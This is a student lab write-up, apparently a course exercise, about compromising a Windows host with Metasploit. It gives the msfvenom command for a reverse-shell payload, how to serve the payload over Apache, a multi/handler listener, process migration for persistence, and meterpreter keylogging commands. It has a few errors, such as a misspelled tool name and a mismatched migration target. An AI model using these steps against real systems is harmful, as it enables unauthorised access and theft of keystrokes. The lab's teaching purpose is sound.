# 7.Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![image](https://github.com/Saranyaaav/Compromising-windows-using-Metasploit/assets/144870813/d1355a54-549c-4251-9cb2-ffd8029475d6)




Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![image](https://github.com/Saranyaaav/Compromising-windows-using-Metasploit/assets/144870813/0fab784a-f98b-4529-b16f-edb051a54cd8)





copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/Saranyaaav/Compromising-windows-using-Metasploit/assets/144870813/9f385df1-7ef6-4664-bd71-b40a05cdc9a9)





Start apache server
sudo systemctl apache2 start
![image](https://github.com/Saranyaaav/Compromising-windows-using-Metasploit/assets/144870813/b75c3b4a-80c0-4488-b2bc-cf32e724221c)





Check the status of apache2
![image](https://github.com/Saranyaaav/Compromising-windows-using-Metasploit/assets/144870813/35071646-4aff-4177-b96c-2969a7c115e4)




Invoke msfconsole:
## OUTPUT:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![image](https://github.com/Saranyaaav/Compromising-windows-using-Metasploit/assets/144870813/2c7fc124-656e-45f5-9aec-d375164e90ea)




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![image](https://github.com/Saranyaaav/Compromising-windows-using-Metasploit/assets/144870813/be4bb428-a0ff-4176-a41b-450c8582c58e)



Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/Saranyaaav/Compromising-windows-using-Metasploit/assets/144870813/bbb60dfc-9938-4a23-bdfb-c4790d087667)



To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![image](https://github.com/Saranyaaav/Compromising-windows-using-Metasploit/assets/144870813/7cbb57bb-ad6e-481a-9a41-ee706e5be473)




Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/Saranyaaav/Compromising-windows-using-Metasploit/assets/144870813/06a48691-f75d-40e2-8ff0-9c247cab5780)




keyscan_dump	Shows the keystrokes captured so far

![image](https://github.com/Saranyaaav/Compromising-windows-using-Metasploit/assets/144870813/3ad1d31f-f013-4b1f-923a-6625c4e2a0ba)




## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
